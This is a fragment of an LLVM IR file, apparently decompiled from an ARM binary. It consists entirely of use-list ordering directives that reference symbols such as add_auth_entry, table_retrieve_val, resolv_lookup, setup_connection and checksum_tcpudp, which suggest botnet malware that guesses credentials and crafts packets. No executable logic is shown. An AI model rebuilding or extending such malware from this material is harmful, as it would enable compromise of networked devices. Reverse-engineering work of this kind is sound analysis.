  uselistorder i32 %v0_11714, { 1, 0 }
  uselistorder i32 %v3_116b8, { 1, 0 }
  uselistorder i1 %v7_11630, { 1, 0 }
  uselistorder i32 %v3_1162c, { 1, 0, 2, 3 }
  uselistorder i1 %v2_11618, { 1, 0 }
  uselistorder i32 %.424, { 1, 0 }
  uselistorder i1 %v7_11600, { 1, 0 }
  uselistorder i32 %v0_115fc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_115d4, { 1, 0 }
  uselistorder i32 %v0_115d4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11558, { 1, 0 }
  uselistorder i32 %v0_1151c, { 1, 0 }
  uselistorder i32 %v0_11508.pr, { 1, 0 }
  uselistorder i32 %v0_114d4, { 1, 2, 0 }
  uselistorder i32 %v0_11494, { 1, 0 }
  uselistorder i32 %v1_1148c, { 1, 0 }
  uselistorder i32 %v1_11484, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11480, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11480, { 0, 2, 1 }
  uselistorder i32 %v0_11460.pr, { 1, 0 }
  uselistorder i32 %v0_11440.pr, { 1, 0 }
  uselistorder i1 %v7_11418, { 1, 0 }
  uselistorder i1 %v2_11408, { 1, 0, 2 }
  uselistorder i1 %v2_113ec, { 1, 0, 2 }
  uselistorder i32 %v1_1140c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_113e0, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_11410, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v7_113bc, { 1, 0 }
  uselistorder i32 %v5_113b8, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %v1_113a4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_113a4, { 0, 2, 1 }
  uselistorder i32 %v0_1139c, { 1, 0 }
  uselistorder i1 %v7_11398, { 1, 0 }
  uselistorder i1 %v7_11390, { 1, 0 }
  uselistorder i1 %v8_11388, { 1, 0 }
  uselistorder i1 %v7_1136c, { 1, 0 }
  uselistorder i1 %v7_11364, { 1, 0 }
  uselistorder i1 %v8_1135c, { 1, 0 }
  uselistorder i32 %v1_11344, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %v3_11340, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1132c, { 1, 0 }
  uselistorder i1 %v7_11320, { 1, 0 }
  uselistorder i32 %v5_1131c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11308, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11308, { 0, 2, 1 }
  uselistorder i32 %v0_11300, { 1, 0 }
  uselistorder i1 %v7_112fc, { 1, 0 }
  uselistorder i1 %v7_112f4, { 1, 0 }
  uselistorder i1 %v7_112ec, { 1, 0 }
  uselistorder i1 %v8_112e4, { 1, 0 }
  uselistorder i1 %v7_112c8, { 1, 0 }
  uselistorder i1 %v7_112c0, { 1, 0 }
  uselistorder i1 %v7_112b8, { 1, 0 }
  uselistorder i1 %v8_112b0, { 1, 0 }
  uselistorder i32 %v1_11298, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v3_11294, { 1, 0, 2, 3 }
  uselistorder i1 %v8_11234, { 1, 0 }
  uselistorder i8 %v3_1122c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11224, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11224, { 0, 2, 1 }
  uselistorder i32 %v0_1121c, { 1, 0 }
  uselistorder i1 %v7_11218, { 1, 0 }
  uselistorder i1 %v7_11210, { 1, 0 }
  uselistorder i1 %v7_11208, { 1, 0 }
  uselistorder i1 %v7_111f4, { 1, 0 }
  uselistorder i1 %v7_111ec, { 1, 0 }
  uselistorder i1 %v7_111e4, { 1, 0 }
  uselistorder i1 %v8_111dc, { 1, 0 }
  uselistorder i32 %v1_111c4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_11160, { 1, 0 }
  uselistorder i8 %v3_11158, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11150, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11150, { 0, 2, 1 }
  uselistorder i32 %v0_11148, { 1, 0 }
  uselistorder i1 %v7_11144, { 1, 0 }
  uselistorder i1 %v7_1113c, { 1, 0 }
  uselistorder i1 %v7_11134, { 1, 0 }
  uselistorder i1 %v7_11120, { 1, 0 }
  uselistorder i1 %v7_11118, { 1, 0 }
  uselistorder i1 %v7_11110, { 1, 0 }
  uselistorder i1 %v8_11108, { 1, 0 }
  uselistorder i32 %v1_110f0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_1108c, { 1, 0 }
  uselistorder i8 %v3_11084, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1107c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1107c, { 0, 2, 1 }
  uselistorder i32 %v0_11074, { 1, 0 }
  uselistorder i1 %v7_11070, { 1, 0 }
  uselistorder i1 %v7_11068, { 1, 0 }
  uselistorder i1 %v7_11060, { 1, 0 }
  uselistorder i1 %v7_1104c, { 1, 0 }
  uselistorder i1 %v7_11044, { 1, 0 }
  uselistorder i1 %v7_1103c, { 1, 0 }
  uselistorder i1 %v8_11034, { 1, 0 }
  uselistorder i32 %v1_1101c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10fb8, { 1, 0 }
  uselistorder i8 %v3_10fb0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10fa8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10fa8, { 0, 2, 1 }
  uselistorder i32 %v0_10fa0, { 1, 0 }
  uselistorder i1 %v7_10f9c, { 1, 0 }
  uselistorder i1 %v7_10f94, { 1, 0 }
  uselistorder i1 %v7_10f8c, { 1, 0 }
  uselistorder i1 %v7_10e58, { 1, 0 }
  uselistorder i1 %v7_10e50, { 1, 0 }
  uselistorder i1 %v7_10e48, { 1, 0 }
  uselistorder i1 %v8_10e40, { 1, 0 }
  uselistorder i32 %v1_10e28, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10dc4, { 1, 0 }
  uselistorder i8 %v3_10dbc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10db4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10db4, { 0, 2, 1 }
  uselistorder i32 %v0_10dac, { 1, 0 }
  uselistorder i1 %v7_10da8, { 1, 0 }
  uselistorder i1 %v7_10da0, { 1, 0 }
  uselistorder i1 %v7_10d98, { 1, 0 }
  uselistorder i1 %v7_10d84, { 1, 0 }
  uselistorder i1 %v7_10d7c, { 1, 0 }
  uselistorder i1 %v7_10d74, { 1, 0 }
  uselistorder i1 %v8_10d6c, { 1, 0 }
  uselistorder i32 %v1_10d54, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_10d40, { 1, 2, 0 }
  uselistorder i32 %v2_10d2c, { 1, 0 }
  uselistorder i32 %v0_10d2c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_10d28, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_10d00, { 2, 1, 0 }
  uselistorder i1 %v7_10ce0, { 1, 0 }
  uselistorder i32 %v1_10c9c, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_10c80, { 1, 0 }
  uselistorder i32 %v1_10c70, { 2, 1, 0 }
  uselistorder i32 %v1_10c6c, { 1, 0 }
  uselistorder i32 %v3_10c0c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10c0c, { 22, 20, 4, 0, 19, 5, 6, 23, 7, 8, 21, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 3, 2, 1 }
  uselistorder i32 %v1_10be8, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10be4, { 1, 0 }
  uselistorder i32 %v4_10bc8, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_10bb4, { 1, 0, 2 }
  uselistorder i32 %v3_10bb0, { 1, 0, 2 }
  uselistorder i32 %v0_11680, { 1, 0, 2 }
  uselistorder i32 %v3_10b78, { 1, 0 }
  uselistorder i32 %v1_10b60, { 3, 2, 1, 0 }
  uselistorder i32 %v3_10b5c, { 1, 0 }
  uselistorder i32 %v3_10b54, { 1, 2, 0 }
  uselistorder i1 %v7_10b44, { 1, 0 }
  uselistorder i32 %v3_10b40, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_10b34, { 1, 0 }
  uselistorder i32 %v2_11844, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1124c, { 4, 5, 1, 0, 3, 10, 7, 9, 8, 6, 2 }
  uselistorder i32 %v2_114bc, { 1, 2, 0 }
  uselistorder i32 %v1_10adc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10adc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10aa8, { 2, 1, 0 }
  uselistorder i32 %v1_10aa4, { 1, 0 }
  uselistorder i1 %v2_10a84, { 1, 0, 2 }
  uselistorder i32 %v0_10a80, { 1, 0, 2 }
  uselistorder i1 %v7_10a4c, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_10a4c, { 1, 0, 2 }
  uselistorder i32 %v2_10a44, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10a38, { 1, 0, 2 }
  uselistorder i32 %v0_10a3c, { 1, 0 }
  uselistorder i32 %v1_10a20, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_10a14, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10a14, { 0, 2, 1 }
  uselistorder i32 %v1_10a04, { 1, 0 }
  uselistorder i32 %v3_11908, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_11914, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %stack_var_-1876.0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10950, { 1, 0 }
  uselistorder i32 %v1_10938, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10944, { 0, 3, 2, 1 }
  uselistorder i32 %v0_108f4, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_108e8, { 2, 1, 0 }
  uselistorder i32 %v1_108c8, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_108a4, { 1, 0 }
  uselistorder i1 %v9_10870, { 1, 0 }
  uselistorder i32 %v1_107c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10770, { 1, 0 }
  uselistorder i32 %v5_10708, { 1, 0 }
  uselistorder i32 %v3_106f8, { 1, 2, 0 }
  uselistorder i16 %v4_106f4, { 1, 0 }
  uselistorder i32 %v3_106f4, { 1, 0 }
  uselistorder i1 %v2_10650, { 1, 0 }
  uselistorder i1 %v3_10634, { 1, 0, 2 }
  uselistorder i1 %v2_10620, { 1, 0 }
  uselistorder i1 %v2_105fc, { 1, 0 }
  uselistorder i32 %v1_105ac, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10598, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10594, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_1057c, { 1, 0 }
  uselistorder i32 %v0_10850, { 0, 1, 2, 3, 6, 7, 8, 11, 10, 4, 5, 9, 13, 12 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i16 %v5_10044.le, { 0, 2, 1 }
  uselistorder i32 %v0_10028, { 2, 0, 1 }
  uselistorder i1 %v7_ffc8, { 1, 0 }
  uselistorder i32 %v3_ffc0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ffac, { 1, 0 }
  uselistorder i32 %v2_ff90, { 1, 0, 2 }
  uselistorder i32 %v0_ff7c, { 1, 2, 0 }
  uselistorder i32 %storemerge296, { 1, 0 }
  uselistorder i32 %v0_fef0, { 3, 2, 1, 0, 4 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-96, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 7, 8, 9, 5, 10, 0, 11, 3, 12, 1, 13, 2, 14, 4, 15, 6, 16 }
  uselistorder i32 %tmp302, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 68, 69, 61, 62, 63, 64, 65, 66, 150, 151, 152, 70, 71, 72, 73, 74, 76, 75, 77, 78, 80, 79, 81, 0, 82, 159, 153, 154, 15, 16, 17, 60, 58, 59, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 155, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 107, 109, 108, 105, 110, 156, 157, 111, 112, 158, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 67, 129, 130, 131, 132, 134, 133, 136, 135, 149, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32* %r2.global-to-local, { 40, 33, 34, 35, 36, 37, 156, 157, 158, 159, 160, 41, 42, 43, 44, 0, 161, 162, 163, 164, 165, 5, 6, 31, 32, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 166, 167, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 38, 39, 59, 60, 62, 61, 58, 169, 63, 170, 64, 171, 172, 65, 66, 67, 68, 69, 70, 71, 72, 73, 168, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155 }
  uselistorder i32* %r1.global-to-local, { 42, 43, 35, 36, 37, 38, 39, 146, 147, 148, 149, 150, 0, 151, 44, 45, 46, 47, 1, 152, 153, 154, 155, 4, 5, 33, 34, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 40, 41, 156, 157, 48, 49, 50, 51, 52, 54, 55, 56, 53, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i32* %r0.global-to-local, { 79, 65, 64, 67, 66, 69, 68, 71, 70, 72, 74, 73, 75, 208, 209, 210, 211, 212, 214, 213, 215, 217, 216, 218, 0, 220, 219, 83, 80, 81, 82, 1, 84, 221, 2, 4, 3, 86, 223, 222, 224, 226, 225, 227, 228, 230, 229, 231, 233, 232, 234, 236, 235, 237, 9, 8, 11, 10, 61, 60, 63, 62, 5, 7, 6, 15, 12, 13, 14, 19, 16, 17, 18, 20, 22, 21, 24, 23, 26, 25, 27, 28, 30, 29, 32, 31, 34, 33, 35, 36, 38, 37, 40, 39, 42, 41, 43, 44, 46, 45, 48, 47, 50, 49, 51, 52, 54, 53, 56, 55, 58, 57, 59, 239, 241, 240, 242, 238, 243, 244, 245, 85, 89, 87, 88, 95, 90, 91, 92, 77, 93, 94, 96, 98, 97, 99, 104, 100, 103, 101, 102, 105, 107, 108, 106, 111, 109, 110, 114, 112, 113, 116, 115, 76, 78, 118, 117, 119, 121, 120, 123, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 197, 196, 198, 203, 199, 200, 201, 202, 204, 205, 206, 207 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 22, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 115, 106, 200, 207, 209, 116, 117, 201, 202, 203, 110, 206, 210, 211, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 111, 20, 21, 26, 22, 23, 24, 25, 27, 28, 29, 30, 31, 208, 105, 32, 38, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 48, 49, 50, 45, 46, 47, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 96, 97, 98, 93, 94, 95, 99, 100, 101, 102, 103, 104, 214, 215, 216, 217, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 218, 114, 112, 113, 130, 131, 132, 133, 135, 134, 136, 137, 138, 141, 143, 144, 142, 139, 140, 212, 213, 204, 145, 205, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 109, 178, 179, 180, 181, 182, 108, 183, 184, 185, 107, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 19, 199 }
  uselistorder i1* %cpsr_c.global-to-local, { 111, 102, 193, 194, 112, 201, 202, 113, 195, 198, 199, 106, 200, 204, 206, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 107, 16, 17, 22, 18, 19, 20, 21, 23, 24, 25, 26, 27, 203, 101, 28, 34, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 68, 69, 70, 65, 66, 67, 71, 72, 73, 74, 75, 76, 80, 81, 82, 77, 78, 79, 83, 84, 85, 86, 87, 88, 92, 93, 94, 89, 90, 91, 95, 96, 97, 98, 99, 100, 209, 210, 211, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 212, 110, 108, 109, 126, 127, 128, 129, 130, 131, 132, 135, 137, 138, 136, 133, 134, 205, 207, 196, 139, 197, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 105, 170, 171, 172, 173, 174, 104, 175, 176, 177, 103, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 208, 192 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_24384.192, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_24384.192 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 2, 0 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 14, 13, 12, 11, 10, 2, 1, 30, 28, 27, 16, 15, 29, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i32)* @table_lock_val, { 14, 13, 12, 41, 40, 39, 38, 37, 11, 36, 5, 4, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 22, 21, 24, 23, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 26, 27, 28, 0, 1, 2, 3, 4, 29, 5, 35, 36, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 37, 38, 39, 23, 24, 25, 30, 31, 32, 33, 34, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 (i32)* @table_unlock_val, { 28, 27, 26, 48, 47, 46, 45, 44, 25, 43, 20, 19, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 18, 17, 16, 31, 30, 29, 24, 23, 22, 21, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 3, 2, 0 }
  uselistorder i32 540, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 0, 2, 1 }
  uselistorder i32 134217728, { 2, 0, 1 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10 }
  uselistorder i8 2, { 0, 4, 3, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 12, 9 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_24370.326, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i16* bitcast (i32* @global_var_24362.323 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), { 0, 5, 1, 6, 2, 3, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b404.287 to i32), { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b594.275 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1b570.269 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b550.261 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), { 0, 19, 1, 20, 2, 21, 3, 22, 4, 23, 5, 24, 6, 7, 8, 25, 9, 26, 10, 27, 11, 28, 12, 29, 13, 30, 14, 31, 15, 32, 16, 33, 17, 34, 18, 35 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b508.243 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4dc.235 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), { 0, 1, 2, 7, 3, 8, 4, 9, 5, 10, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b490.215 to i32), { 0, 35, 1, 36, 2, 37, 3, 38, 4, 39, 5, 40, 6, 41, 7, 42, 8, 43, 9, 44, 10, 45, 11, 46, 12, 47, 13, 48, 14, 49, 15, 50, 16, 51, 17, 52, 18, 53, 19, 54, 20, 55, 21, 56, 22, 57, 23, 58, 24, 59, 25, 60, 26, 61, 27, 62, 28, 63, 29, 64, 30, 65, 31, 32, 33, 66, 34, 67 }
  uselistorder i32 ptrtoint (i32* @global_var_1b498.213 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_24379.210, { 1, 0 }
  uselistorder i16* @global_var_2436e.209, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i8 6, { 5, 6, 7, 3, 4, 8, 0, 9, 1, 2 }
  uselistorder i8 16, { 0, 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i16* @global_var_2436c.204, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_2436c.204 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_24378.205, { 1, 0 }
